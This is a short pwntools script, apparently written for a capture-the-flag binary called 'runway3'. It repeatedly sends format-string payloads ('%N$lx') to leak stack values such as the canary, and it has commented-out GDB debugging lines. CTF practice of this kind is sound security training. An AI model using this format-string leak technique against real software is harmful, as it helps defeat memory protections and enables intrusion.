from pwn import *
 

e = ELF("./runway3")
#io = remote("orange.uctf.ir", 5001)
context.log_level = 'critical'
for i in range(100):
  io = e.process()
  io.sendlineafter("Is it just me, or is there an echo in here?\n", "%%%d$lx" % i)
  print("%d - %s" % (i, io.recvline().strip().decode()))
  io.close()
# Attach GDB to the running process
#gdb.attach(io, gdbscript="""
#init-pwndbg
#canary
#""")
# Keep the process alive to interact with GDB
#io.interactive()
